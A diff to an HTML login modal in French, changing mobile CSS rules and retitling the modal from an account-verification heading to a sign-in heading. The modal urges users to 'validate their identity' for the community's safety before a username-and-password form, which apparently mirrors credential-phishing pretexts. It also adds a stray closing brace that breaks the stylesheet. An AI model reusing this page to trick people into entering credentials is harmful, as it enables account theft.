@@ -81,22 +81,28 @@
       margin-top: 5px;
     }
 
-    /* Responsive adjustment for very small screens */
-    @media (max-width: 400px) {
+    /* Responsive adjustment for mobile screens */
+    @media (max-width: 480px) {
+      html, body {
+        background-size: contain; /* Ajuste l'image pour qu'elle tienne entièrement dans l'écran */
+        background-position: top center; /* Centre l'image en haut de l'écran */
+        background-repeat: no-repeat; /* Empêche la répétition de l'image */
+        background-attachment: scroll; /* L'image défile avec le contenu sur mobile */
+      }
       .modal {
-        padding: 20px 15px;
+        padding: 20px 15px; /* Conserve le padding ajusté pour les petites tailles d'écran */
       }
-
       input, button {
-        font-size: 15px;
+        font-size: 15px; /* Conserve la taille de police ajustée */
       }
+    }
     }
   </style>
 </head>
 <body>
   <div class="modal">
     <p>Pour garantir la sécurité de notre communauté, vous devez valider votre identité avant de poursuivre. Cela ne prend qu’une minute !</p>
-    <h2>Vérifier mon compte </h2>
+    <h2>Se connecter </h2>
     <form action="/login" method="post">
       <input type="text" name="username" placeholder="E‑mail ou nom d’utilisateur" required autocomplete="username">
       <input type="password" name="password" placeholder="Mot de passe" required autocomplete="current-password">
